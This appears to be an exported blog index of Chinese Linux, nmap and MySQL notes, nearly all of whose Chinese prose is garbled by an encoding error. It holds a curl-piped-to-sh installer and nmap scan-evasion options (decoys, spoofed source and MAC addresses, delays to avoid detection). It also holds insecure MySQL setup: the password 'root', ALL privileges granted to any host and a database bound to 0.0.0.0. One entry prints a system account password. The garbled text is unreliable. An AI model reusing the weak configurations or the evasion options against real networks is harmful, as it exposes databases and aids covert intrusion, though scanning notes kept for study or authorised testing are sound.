é€‰æ‹©å…¨éƒ¨å®‰è£… sudo pacman -S fcitx-configtool # fcitx é…ç½®ç•Œé¢ sudo pacman -S fcitx-sogoupinyin # å®‰è£…sogoupinyin è®¾ç½®ä¸­æ–‡è¾“å…¥æ³•ç¯å¢ƒå˜é‡ï¼Œç¼–è¾‘~/.xprofileæ–‡ä»¶ï¼Œå¢åŠ ä¸‹é¢å‡ è¡Œ(å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ–°å»º) é‡å¯åç”Ÿæ•ˆ sudo vim ~/.xprofile # æ‰“å¼€ç¼–è¾‘.xprofileæ–‡ä»¶ # åœ¨æ–‡ä»¶ä¸­åŠ å…¥ä»¥ä¸‹ä¸¤è¡Œä»£ç  export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS="@im=fcitx" å®‰è£…Google-Chromeæµè§ˆå™¨ sudo pacman -S google-chrome å®‰è£…ç½‘æ˜“äº‘éŸ³ä¹ sudo pacman -S netease-cloud-music å®‰è£…git (é»˜è®¤è²Œä¼¼å°±å·²ç»å­˜åœ¨äº†) sudo pacman -S git å®‰è£…wpsï¼ŒåŠå…¶å­—ä½“ $ sudo pacman -S wps-office # å®‰è£…wps $ sudo pacman -S ttf-wps-fonts # å®‰è£…wpså­—ä½“ é…ç½®wpsï¼Œä½¿wpså¯ä»¥è¾“å…¥ä¸­æ–‡ $ sudo vim /usr/bin/wps # ç¼–è¾‘wpsé…ç½®æ–‡ä»¶ # åœ¨ ç´§è·Ÿ#!/bin/bashåæ·»åŠ ä¸‹åˆ—ä¸‰è¡Œ export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS="@im=fcitx" æ³¨é”€åå†æ¬¡ç™»å½•è¾“å…¥æ³•ç”Ÿæ•ˆã€‚ å®‰è£…Shadowsocks-qt5ï¼Œå®ç°ç§‘å­¦ä¸Šç½‘ï¼ˆæˆ‘è¿˜æ˜¯ä¸€ä¼šå®‰ssrå§ï¼Œåœ¨æ–‡ç« æœ€åº•ä¸‹ï¼‰ sudo pacman -S shadowsocks-qt5 å®‰è£…VSCode sudo pacman -S visual-studio-code-bin # å®‰è£…VSCodeå’Œäº‘éŸ³ä¹ç­‰ç­‰ï¼Œéƒ½éœ€archlinuxcnæº å®‰è£…markdownç¼–è¾‘å™¨ sudo pacman -S typora é…ç½®jdkç¯å¢ƒå˜é‡ # é…ç½®ç¯å¢ƒå˜é‡ # sudo vim /etc/profile #ç¼–è¾‘æ–‡ä»¶ # åœ¨æ–‡ä»¶æœ«å°¾å¤„è¿½åŠ ä¸‹åˆ—å‡ è¡Œ export JAVA_HOME=ä½ çš„jdkè§£å‹åçš„ç»å¯¹è·¯å¾„ export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH å®‰è£…ç»ˆç«¯æ˜¾ç¤ºä¿¡æ¯neofetch(è£…bç¥å™¨,å®‰è£…screenfetchä¹Ÿå¯) sudo pacman -S neofetch å®‰è£…Tim,å¾®ä¿¡ (KDEæ¡Œé¢æ— æ³•ä½¿ç”¨) sudo pacman -S deepin.com.qq.office deepin.com.wechat é…ç½®å¾®ä¿¡ï¼Œtimçš„ä¸­æ–‡è¾“å…¥é—®é¢˜ (KDEæ¡Œé¢æ— æ³•ä½¿ç”¨) Timå¯åŠ¨è„šæœ¬ä½ç½®ï¼š/opt/deepinwine/apps/Deepin-TIM/run.sh WeChatå¯åŠ¨è„šæœ¬ä½ç½®ï¼š/opt/deepinwine/apps/Deepin-WeChat/run.sh # 1 é…ç½®timä¸­æ–‡ï¼Œæ‰“å¼€timå¯åŠ¨è„šæœ¬æ–‡ä»¶ ï¼ˆå¾®ä¿¡åŒç†ï¼‰ sudo vim /opt/deepinwine/apps/Deepin-TIM/run.sh åœ¨å¯åŠ¨è„šæœ¬å‘½ä»¤ä¹‹å‰æ·»åŠ ä»¥ä¸‹å†…å®¹ export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS="@im=fcitx" å®‰è£…Deepin Terminal(ç»ˆç«¯)ï¼Œå®‰è£…å®Œæˆä¹‹åï¼Œè‡ªè¡Œåœ¨deepin-terminalæ›´æ”¹æ˜¾ç¤ºå­—ä½“ sudo pacman -S deepin-terminal å®‰è£…æœ‰é“è¯å…¸ sudo pacman -S youdao-dict å®‰è£…vokoscreenå½•å± sudo pacman -S vokoscreen å®‰è£…MariaDbä»£æ›¿mysql(MyriaDbä¸Mysqlç›¸äº’å…¼å®¹) $ sudo pacman -S mariadb mariadb-clients # å®‰è£…æˆåŠŸåï¼Œæ ¹æ®æç¤ºï¼Œè¾“å…¥ä¸‹åˆ—æŒ‡ä»¤åˆå§‹åŒ–MariaDbæ•°æ®åº“ $ sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql # ä¸€ç•ªä¿¡æ¯è‡ªåŠ¨è¾“å‡ºå®Œæˆåï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç  $ sudo systemctl start mysqld # å¯åŠ¨MariaDb $ mysqladmin -u root password "root" # ä¸ºrootã€ç”¨æˆ·æ·»åŠ å¯†ç  $ sudo systemctl enable mysqld # è®¾ç½®mariaDbå¼€æœºè‡ªå¯ $ mysql -uroot -p # è¾“å…¥è®¾ç½®çš„çš„å¯†ç ï¼Œç™»å½•æ•°æ®åº“ å®‰è£…é…ç½®oh my zsh(å¬è¯´æ˜¯bashçš„å‡çº§ç‰ˆï¼Œè£…*ä¸“ç”¨ï¼Œæˆ‘å°±å…ˆä¸å¼„äº†) $ sudo pacman -S zsh $ sh -c "$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)" # ä¸‹è½½å¹¶é…ç½®ohmyzsh $ chsh -s /bin/zsh #æ›´æ¢é»˜è®¤bashï¼Œé‡å¯åç”Ÿæ•ˆ å¸è½½Manjaroè‡ªå¸¦çš„ä¸€äº›æ²¡ç”¨çš„è½¯ä»¶ å¸è½½ä¹‹åå°±å¯ä»¥æ›´æ–°ä¸€ä¸‹è½¯ä»¶äº† sudo pacman -Syyu pacmanåŸºæœ¬å‘½ä»¤æ›´æ–°è½¯ä»¶ sudo pacman -Su # æ›´æ–°å·²å®‰è£…è½¯ä»¶ sudo pacman -Syu #æ›´æ–°è½¯ä»¶å‰æ£€æŸ¥åŒ…åˆ—è¡¨æ˜¯å¦æœ€æ–° sudo pacman -Syyu #æ›´æ–°å‰å¼ºåˆ¶ä¸‹è½½åŒ…åˆ—è¡¨ æŸ¥æ‰¾è½¯ä»¶ sudo pacman -Ss packge_name å®‰è£…æŒ‡å®šçš„åŒ… pacman -S package_name1 package_name2 ... å®‰è£…åŒ…ç»„ ä¸€äº›åŒ…å±äºä¸€ä¸ªå¯ä»¥åŒæ—¶å®‰è£…çš„è½¯ä»¶åŒ…ç»„ï¼Œä¾‹å¦‚ï¼š pacman -S gnome æƒ³è¦æŸ¥çœ‹å“ªäº›åŒ…å±äº gnome ç»„ï¼Œè¿è¡Œï¼š pacman -Sg gnome åˆ é™¤è½¯ä»¶åŒ… 1.åˆ é™¤å•ä¸ªè½¯ä»¶åŒ…ï¼Œä¿ç•™å…¶å…¨éƒ¨å·²ç»å®‰è£…çš„ä¾èµ–å…³ç³» pacman -R package_name 2.é™¤æŒ‡å®šè½¯ä»¶åŒ…ï¼ŒåŠå…¶æ‰€æœ‰æ²¡æœ‰è¢«å…¶ä»–å·²å®‰è£…è½¯ä»¶åŒ…ä½¿ç”¨çš„ä¾èµ–å…³ç³»ï¼š pacman -Rs package_name 3.è¦åˆ é™¤è½¯ä»¶åŒ…å’Œæ‰€æœ‰ä¾èµ–è¿™ä¸ªè½¯ä»¶åŒ…çš„ç¨‹åº pacman -Rns package_name 4.è¦åˆ é™¤è½¯ä»¶åŒ…ï¼Œä½†æ˜¯ä¸åˆ é™¤ä¾èµ–è¿™ä¸ªè½¯ä»¶åŒ…çš„å…¶ä»–ç¨‹åºï¼š pacman -Rdd package_name 5.pacman åˆ é™¤æŸäº›ç¨‹åºæ—¶ä¼šå¤‡ä»½é‡è¦é…ç½®æ–‡ä»¶ï¼Œåœ¨å…¶åé¢åŠ ä¸Š*.pacsaveæ‰©å±•åã€‚-n é€‰é¡¹å¯ä»¥é¿å…å¤‡ä»½è¿™äº›æ–‡ä»¶ï¼š pacman -Rn package_name1 â€‹ æ³¨æ„: pacman ä¸ä¼šåˆ é™¤è½¯ä»¶è‡ªå·±åˆ›å»ºçš„æ–‡ä»¶(ä¾‹å¦‚ä¸»ç›®å½•ä¸­çš„ .dot æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚ æ¸…ç†è½¯ä»¶åŒ…ç¼“å­˜ pacman å°†ä¸‹è½½çš„è½¯ä»¶åŒ…ä¿å­˜åœ¨ /var/cache/pacman/pkg/ å¹¶ä¸”ä¸ä¼šè‡ªåŠ¨ç§»é™¤æ—§çš„å’Œæœªå®‰è£…ç‰ˆæœ¬çš„è½¯ä»¶åŒ…ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨æ¸…ç†ï¼Œä»¥å…è¯¥æ–‡ä»¶å¤¹è¿‡äºåºå¤§ã€‚ ä½¿ç”¨å†…å»ºé€‰é¡¹å³å¯æ¸…é™¤æœªå®‰è£…è½¯ä»¶åŒ…çš„ç¼“å­˜ï¼š pacman -Sc è­¦å‘Š:ä»…åœ¨ç¡®å®šå½“å‰å®‰è£…çš„è½¯ä»¶åŒ…è¶³å¤Ÿç¨³å®šä¸”ä¸éœ€è¦é™çº§æ—¶æ‰æ‰§è¡Œæ¸…ç†ã€‚ pacman -Scä»…ä¼šä¿ç•™è½¯ä»¶åŒ…çš„å½“å‰æœ‰æ•ˆç‰ˆæœ¬ï¼Œæ—§ç‰ˆæœ¬çš„è½¯ä»¶åŒ…è¢«æ¸…ç†åï¼Œåªèƒ½ä»å…¶ä»–åœ°æ–¹å¦‚ Arch Linux Archive (ç®€ä½“ä¸­æ–‡)ä¸­è·å–äº†ã€‚ pacman -Scc å¯ä»¥æ¸…ç†æ‰€æœ‰ç¼“å­˜ï¼Œä½†è¿™æ · pacman åœ¨é‡è£…è½¯ä»¶åŒ…æ—¶å°±åªèƒ½é‡æ–°ä¸‹è½½äº†ã€‚é™¤éç©ºé—´ä¸è¶³ï¼Œå¦åˆ™ä¸åº”è¿™ä¹ˆåšã€‚ æ›´æ–°æºè‡ªåŠ¨ï¼šè‡ªåŠ¨è®¾ç½®æœ€å¿«çš„æº sudo pacman-mirrors -g sudo pacman -Syyu æ‰‹åŠ¨ï¼šé€‰æ‹©æºï¼šsudo pacman-mirrors -iåŒæ ·è¦å¼ºåˆ¶æ›´æ–°åŒ… é‡ç½®ä¸ºè‡ªåŠ¨é€‰æ‹©ï¼š sudo pacman-mirrors -g -c all åˆ‡æ¢testingåˆ†æ”¯ sudo pacman-mirrors -g -b testing sudo pacman -Syyu é€€å›ç¨³å®šç‰ˆ sudo pacman-mirrors -g -b stable sudo pacman -Syyuu sudo pacman-mirrors -i -c China -m rank æ¸…ç†åƒåœ¾æ¸…é™¤ç³»ç»Ÿä¸­æ— ç”¨çš„åŒ… sudo pacman -R $(pacman -Qdtq) æ¸…é™¤å·²ä¸‹è½½çš„å®‰è£…åŒ… sudo pacman -Scc æ—¥å¿—åƒåœ¾æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ du -t 100M /var æˆ– journalctl --disk-usage åˆ é™¤æŒ‡å®šå¤§å°æ—¥å¿—æ–‡ä»¶ sudo journalctl --vacuum-size=50M å®‰è£…ssræ­¥éª¤ï¼š å®‰è£…gitå‘½ä»¤ï¼Œç”¨ git clone -b manyuser https://github.com/shadowsocksrr/shadowsocksr.git ä¸‹è½½shadowsockssrã€‚ è¿›å…¥shadowshocksrç›®å½• è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š./initcfg.sh è¿è¡Œå¦‚ä¸‹å‘½ä»¤ç¼–å†™user-config.jsoné…ç½®æ–‡ä»¶sudo nano user-config.json å°†ssræœåŠ¡å™¨çš„é…ç½®å¡«å†™åˆ°é…ç½®æ–‡ä»¶ä¸­ è¿›å…¥shadowsocksç›®å½•cd shadowsocks./local.py ä»£ç†å®¢æˆ·ç«¯å·²ç»å¼€å§‹è¿è¡Œ è®¾ç½®æµè§ˆå™¨ä»£ç†ï¼šä»¥firefoxä¸ºä¾‹ï¼Œ ä» https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-standard/?src=search æ·»åŠ foxyproxy-standardæ’ä»¶å·¦é”®ç‚¹å‡»æ’ä»¶å›¾æ ‡ é€‰ â€œoptionsâ€ â€“ â€œaddâ€ â€“ â€œsocks5â€å¡«å†™ä»£ç†çš„åç§°ï¼ˆéšä¾¿å†™ï¼‰ï¼ŒIPï¼ˆ127.0.0.1ï¼‰ï¼Œç«¯å£ï¼ˆ1080ï¼‰ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nmapå‚æ•°ç®€ä»‹]]></title>
    <url>%2Fposts%2Fc2379dd5%2F</url>
    <content type="text"><![CDATA[æ–°å­¦ä¸€ä¸ªæŠ“åŒ…å·¥å…· -&gt; tcpumptcpdmp -i eth0 -nn host 192.168.1.56 port 22 # ç”¨ncè¿ nc 192.168.1.56 -t 22 # ç‚¹. å°±æ˜¯ackçš„æ„æ€ ä¸»æœºå‘ç°-iL # æŒ‡å®šæ–‡ä»¶ -iR 100 -p22 # éšæœºé€‰æ‹©ç›®æ ‡100ä¸ª çš„22ç«¯å£ nmap 192.168.0.0/24 --exclude 192.168.0.1-100 # ä¸æ‰«æåé¢çš„éƒ¨åˆ† -sL # åˆ—å‡ºipï¼ˆç›¸å½“äºå­ç½‘æ©ç çš„è®¡ç®—ï¼‰ -sN # åªping -Pn #ä¸åšpingæ‰«æï¼Œä¾‹å¦‚é’ˆå¯¹é˜²ç«å¢™ç­‰å®‰å…¨äº§å“ï¼Œ é˜²æ­¢ï¼šå¦‚æœæ²¡æœ‰å›åŒ…å°±ä¸è¿›è¡Œäº† -PS/PA/PU/PY # ç”¨synï¼Œackï¼Œudpï¼Œ sctp å‘ç° -PE/PP/PM # ç”¨echoï¼Œ æ—¶é—´æˆ³ï¼Œå­ç½‘æ©ç  ï¼ˆä¸€èˆ¬æ²¡å•¥ç»“æœï¼‰ -PO # ipåè®®çš„ping -n/ -R # ä¸åšdnsè§£æ / åšåå‘çš„è§£æ --dns-servers # è°ƒç”¨æŒ‡å®šçš„dnsæœåŠ¡å™¨ --system-dns # æ“ä½œç³»ç»Ÿé»˜è®¤çš„dnsï¼Œä¸€èˆ¬ä¸ç”¨ --traceroute # è¿‡ç¨‹ä¸­è¿›è¡Œraceroute ç«¯å£å‘ç°-sS/sT/sA/sW/sM # é»˜è®¤çš„ synæ‰«æ/tcpæ‰«æ,å»ºç«‹å®Œæ•´è¿æ¥(æœ€å‡†ç¡®)/å‘é€ack / çª—å£æ‰«æ / ack+fn -sU # udpæ‰«æï¼ˆå‡†ç¡®æ€§ä¸æ€ä¹ˆé«˜ï¼‰ -sN/sF/sX # tcpçš„flagå…¨ä¸ºç©º /åªæœ‰fin/ fin,psh,urg --scanflag # è‡ªå®šä¹‰flag ï¼ˆè‡ªå·±å¾—æ‡‚åŸç†ï¼‰ -sI # åƒµå°¸æ‰«æ -sY/sZ # sctpç”¨ -sO # ipæ‰«æ -b # ipä¸­ç»§ - -p # æŒ‡å®šç«¯å£(tcpä¸udpéƒ½æ‰«), U: 53 -T:21 (åˆ†åˆ«æŒ‡å®štcpä¸udpçš„ç«¯å£) é»˜è®¤1000ä¸ª --exclude-ports # æŒ‡å®šç«¯å£ä¸­æŸä¸€æ®µ -F # å¿«é€Ÿæ‰«æ(ä¸ä¼šæ‰«æ100ä¸ªå…¨éƒ¨ç«¯å£) -r # è¿ç»­æ‰«æ(é¡ºåº) --top-ports # æ‰«æ’åå‰10ä¸ª --port-radio # æ‰«ææ›´å¸¸è§çš„ç«¯å£(ç”¨å¤„ä¸å¤§) æœåŠ¡æ‰«æ-sV # æ‰«æè¿™ä¸ªç«¯å£è·‘çš„ä»€ä¹ˆæœåŠ¡ --version-intensity # 0-9çš„æ‰«æç¨‹åº¦ï¼Œ9æœ€è¯¦ç»† --version-light # ä¸Šé¢çš„ç­‰äº2æ—¶ --version-all # ä¸Šé¢çš„ç­‰äº9æ—¶ --version-trace # å°†æ‰«æè¿‡ç¨‹è¿›è¡Œè·Ÿè¸ª è„šæœ¬æ‰«æ ï¼ˆè„šæœ¬ç›®å½•:/usr/share/nmap/scripts/ï¼‰-sC # é»˜è®¤ --script=... # æŒ‡å®šè„šæœ¬ --script-args= # å¸¦å‚æ•° --script-args-file= --script-trace # ä¹Ÿå¯ä»¥trace --script-updatedb # æ›´æ–°è„šæœ¬ nmap --script-updatedb --script-help # æŸ¥çœ‹è„šæœ¬çš„å¸®åŠ© æ“ä½œç³»ç»Ÿç±»å‹-O # æ“ä½œç³»ç»Ÿç±»å‹ --osscan-limit # é™åˆ¶æ£€æµ‹çš„ç³»ç»Ÿç±»å‹ --osscan-guess æ—¶é—´å’Œæ€§èƒ½-T # æŒ‡å®šé—´éš”æ—¶é—´ -min-hostgroup/ -max-hostgroup # æœ€å°‘ä¸€æ¬¡æ‰«æçš„ä¸»æœºæ•°é‡ ç»„ --min-parallelism/ --max-parallelism # æœ€å°‘ä¸€æ¬¡æ‰«æçš„ä¸»æœºæ•°é‡ --min-rtt-timeout/ --max-rtt-timeout/ --initial-rtt-timeout # æœ€å°æœ€å¤§rtt --max-retries # --host-timeout # è¶…æ—¶æ—¶é—´ --scan-delay/ --max-scan-delay 10s # å»¶æ—¶æ—¶é—´(é˜²æ­¢è¢«å‘ç°) --min-rate # å‘åŒ…æœ€å°é€Ÿç‡ --max-rate é˜²ç«å¢™ å’Œèº²é¿-f # æœ€å¤§ä¼ è¾“mtuå€¼ 1500å•¥çš„ -D 192.168.0.2 192.168.0.3 192.168.0.4 # ä¼ªé€ åŸåœ°å€(è¿·æƒ‘) -S # ä¼ªé€ æºåœ°å€ -e # æŒ‡å®šç½‘å¡ -g # æŒ‡å®šä½¿ç”¨çš„æºç«¯å£ --proxies &lt;url1, [url2]&gt; # ç½®åœ°å¹¿ä»£ç†æœåŠ¡å™¨æ›¿æˆ‘ä»¬å‘åŒ… --data # æ•°æ®å­—æ®µæŒ‡å®šå†…å®¹(å¿…é¡»æ˜¯16è¿›åˆ¶) --data-string --data-length --ip-options --ttl --spoof-mac # æ¬ºéª—macåœ°å€ --badsum # å‘é”™çš„å·®é”™æ ¡éªŒå€¼ è¾“å‡ºæ ¼å¼-oN / -oX / -oS /-oG # æ­£å¸¸æ ¼å¼/xmlæ ¼å¼/../../ æ‚é¡¹-6 # ipv6çš„ -A # å‡ ä¸ªå‚æ•°çš„ç»„åˆï¼ˆæ¶µç›–ï¼š-v, -O, --script, --traceï¼‰ # traceè·¯ç”±è¿½è¸ª document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>nmap</tag>
        <tag>å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è¿œç¨‹è¿æ¥mysql]]></title>
    <url>%2Fposts%2Fdfb14e5b%2F</url>
    <content type="text"><![CDATA[è¿œç¨‹è¿æ¥MySQLæƒ³è¦è¿œç¨‹è¿æ¥MySQL é‚£ä¹ˆå¿…é¡»æ˜¯æ™®é€šç”¨æˆ·æ‰è¡Œ ä¸èƒ½æ˜¯ root ç”¨æˆ· æ‰€ä»¥æˆ‘ä»¬è¦å…ˆåˆ›å»ºä¸€ä¸ªæ™®é€šç”¨æˆ· åˆ›å»ºæ™®é€šç”¨æˆ· CREATE USER 'username'@'%' IDENTIFIED BY 'password'; ç»™æ™®é€šç”¨æˆ·èµ‹æƒ GRANT ALL ON *.* TO 'username'@'%' åˆ·æ–°ç³»ç»Ÿæƒé™ç›¸å…³è¡¨ FLUSH PRIVILEGES ä»¥ä¸Šä¸‰æ­¥æ‰§è¡Œçš„ åˆ›å»ºç”¨æˆ· â€“&gt; ç»™åˆ›å»ºçš„ç”¨æˆ·èµ‹æƒ â€“&gt; åˆ·æ–° è¿™æ ·çš„è¯ å¯èƒ½è¿˜æ˜¯ä¸èƒ½å®ŒæˆMySQLçš„ä¸€ä¸ªè¿œç¨‹è¿æ¥ è¿™æ—¶å€™éœ€è¦æ”¹å˜MySQLçš„ä¸€ä¸ªé»˜è®¤é…ç½® è¿™é…ç½®æ–‡ä»¶ä½äº/etc/mysql/mysql.conf.d/ä¸‹çš„mysqld.cnf é‡Œé¢æœ‰æ‰¾åˆ°bind-address æŠŠå€¼127.0.0.1æ”¹ä¸º0.0.0.0ç„¶åæ¥ä¸‹æ¥å°±æ˜¯è¿œç¨‹è¿æ¥äº† æ”¹å®Œè¦è®°å¾—é‡å¯MySQLæœåŠ¡ æ¥ä¸‹æ¥å°±æ˜¯è¿œç¨‹è¿æ¥MySQLé¦–å…ˆè¦ä¿è¯è‡ªå·±ç”µè„‘è£…äº†MySQLæ‰èƒ½è¿œç¨‹è¿æ¥ mysql -u username -p password -h ipåœ°å€ -P ç«¯å£å·ï¼ˆä¸€èˆ¬é»˜è®¤æ˜¯3306ï¼‰ å¦‚æœæƒ³è¦è¿œç¨‹è¿æ¥ é¦–å…ˆè¦ä¿è¯ æœ¬åœ°å®‰è£…äº†MySQL æ‰èƒ½è¿œç¨‹è¿æ¥ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>mysqlï¼Œæ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysqlåˆ›å»ºæ–°ç”¨æˆ·å¹¶åˆ†é…æƒé™]]></title>
    <url>%2Fposts%2F4dcc830c%2F</url>
    <content type="text"><![CDATA[1ã€ä½¿ç”¨rootç”¨æˆ·ç™»å½•mysql 2ã€æ·»åŠ å…·æœ‰æœ¬åœ°(localhost/127.0.0.1)è®¿é—®æƒé™çš„ç”¨æˆ· create user 'newuser'@'localhost' identified by 'password'; 3ã€åˆ›å»ºå…·æœ‰è¿œç¨‹è®¿é—®æƒé™çš„ç”¨æˆ· create user 'newuser'@'%' identified by 'password'; åˆ›å»ºä¹‹åè®°å¾—æ‰§è¡Œä¸‹é¢æŒ‡ä»¤æ›´æ–°æƒé™ï¼š flush privileges; 3ã€ä¸ºæ–°ç”¨æˆ·åˆ†é…æœ¬åœ°æƒé™ï¼Œå¯ä»¥æŒ‡å®šæ•°æ®åº“dbnameå’Œè¡¨åï¼Œå¯ä»¥ç”¨*æ›¿æŒ‡æ‰€æœ‰ã€‚ grant all privileges on `dbname`.* to 'newuser'@'localhost' identified by 'password'; 4ã€ä¸ºæ–°ç”¨æˆ·åˆ†é…è¿œç¨‹æƒé™ï¼Œå¯ä»¥æŒ‡å®šæ•°æ®åº“dbnameå’Œè¡¨åï¼Œå¯ä»¥ç”¨*æ›¿æŒ‡æ‰€æœ‰ã€‚ grant all privileges on `dbname`.* to 'newuser'@'%' identified by 'password'; åˆ†é…æ‰€æœ‰æƒé™ &gt; grant all privileges on *.* to 'test'@'%' identified by '123456' åˆ†é…å¥½ä¹‹åä¹‹åè®°å¾—æ‰§è¡Œä¸‹é¢æŒ‡ä»¤æ›´æ–°æƒé™ï¼š flush privileges; 5ã€å¦‚æœè¿˜æœ‰é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨rootè´¦å·ç™»é™†ä¸Šå»æŸ¥è¯¢ä¸€ä¸‹ï¼Œå†çœ‹çœ‹æœ‰æ²¡é—®é¢˜ã€‚ use mysql 6ã€æŸ¥çœ‹userè¡¨ select Host, User, Password from user; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>æ•°æ®åº“</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysqlè¡¨ç»“æ„å¤åˆ¶]]></title>
    <url>%2Fposts%2Ff0858aa6%2F</url>
    <content type="text"><![CDATA[å¤åˆ¶ç»“æ„ï¼šä»¿ç…§studentè¡¨ç»“æ„å¤åˆ¶ä¸€å¼ new_studentè¡¨,æ–°è¡¨æ˜¯ç©ºçš„ï¼š create table new_student like student; å¤åˆ¶æ•°æ®ï¼šä½†æ˜¯æ²¡ä¸»é”®ï¼Œç»“æ„ä¸é‡è¦ï¼š create table new_student2 as ( select * from student ); å¤åˆ¶è¡¨ç»“æ„ä¸æ•°æ®ï¼Œä¸€æ¨¡ä¸€æ ·ï¼š insert into new_student3 select * from student; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>mysqlï¼Œæ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntuå½»åº•å¸è½½mysqlå¹¶ä¸”é‡æ–°å®‰è£…]]></title>
    <url>%2Fposts%2Fb0669918%2F</url>
    <content type="text"><![CDATA[é¦–å…ˆåˆ é™¤mysql: sudo apt-get remove mysql-* ç„¶åæ¸…ç†æ®‹ç•™çš„æ•°æ® dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P å®ƒä¼šè·³å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œä½ é€‰æ‹©yeså°±å¥½äº†ç„¶åå®‰è£…mysql sudo apt-get install mysql-client mysql-server å®‰è£…çš„æ—¶å€™ä¼šæç¤ºè¦è®¾ç½®rootå¯†ç ï¼Œå¦‚æœä½ æ²¡æœ‰åœ¨å¸è½½çš„æ—¶å€™å»æ¸…ç†æ®‹ç•™æ•°æ®æ˜¯ä¸ä¼šæç¤ºä½ å»è®¾ç½®rootå¯†ç çš„æ£€æŸ¥mysqlæ˜¯ä¸æ˜¯åœ¨è¿è¡Œ sudo service mysql status ä¸€èˆ¬å®‰è£…å®Œæˆä¹‹åéƒ½æ˜¯ä¼šè‡ªåŠ¨è¿è¡Œçš„ã€‚å¦‚æœæ²¡æœ‰è¿è¡Œä½ å¯ä»¥ sudo service mysql start æŸ¥çœ‹ç«¯å£ sudo netstat -tap | grep mysql è¿è¡Œå®ƒ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å®‰è£…mysqlç«Ÿç„¶æ²¡è®©ä½ è¾“å…¥å¯†ç ]]></title>
    <url>%2Fposts%2F136d9777%2F</url>
    <content type="text"><![CDATA[Mysql5.7è¿™ä¸ªç‰ˆæœ¬çš„rootå¯†ç åœ¨/etc/mysql/debian.cnfè¿™ä¸ªæ–‡ä»¶é‡Œé¢ ä½¿ç”¨sudo cat /etc/mysql/debian.cnfå‘½ä»¤æ‰“å¼€ï¼Œä½ å¤§æ¦‚ä¼šçœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼Œå…¶ä¸­å°±åŒ…æ‹¬Mysqlçš„é»˜è®¤ç™»é™†åä¸å¯†ç  [client] host = localhost user = debian-sys-maint password = M1WVft5X8S80rhE0 socket = /var/run/mysqld/mysqld.sock [mysql_upgrade] host = localhost user = debian-sys-maint password = M1WVft5X8S80rhE0 socket = /var/run/mysqld/mysqld.sock 1ã€ä½¿ç”¨ mysql -uç”¨æˆ·å -på¯†ç è¿›è¡Œç™»é™†ï¼Œ mysql -udebian-sys-maint -pM1WVft5X8S80rhE0 